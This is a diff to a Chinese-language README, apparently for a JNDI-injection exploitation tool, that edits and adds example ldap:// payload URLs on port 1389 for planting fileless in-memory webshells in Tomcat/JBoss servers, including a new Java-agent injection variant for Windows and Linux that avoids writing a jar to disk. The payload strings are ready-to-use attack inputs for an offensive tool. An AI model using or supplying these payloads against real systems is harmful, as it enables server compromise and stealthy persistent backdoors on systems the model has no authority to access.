@@ -107,7 +107,13 @@ ldap://0.0.0.0:1389/TomcatBypass/JBossServlet/urlr/urlls-bx-obscure
 支持自定义路径：
 不指定时默认路径为nu1r，示例中的rlls就是重新指定的路径。
 ```
-ldap://0.0.0.0:1389/TomcatBypass/JBossServlet/urlr/u-rlls-obscure
+ldap://0.0.0.0:1389/TomcatBypass/JBossServlet/urlr/rlls-bx-obscure
+```
+
+Agent写入：
+因为无Jar落地所以分`winAgent`与`linAgent`实现。
+```
+ldap://0.0.0.0:1389/TomcatBypass/JBossServlet/urlr/rlls-bx-linAgent
 ```
 
 内存马说明：
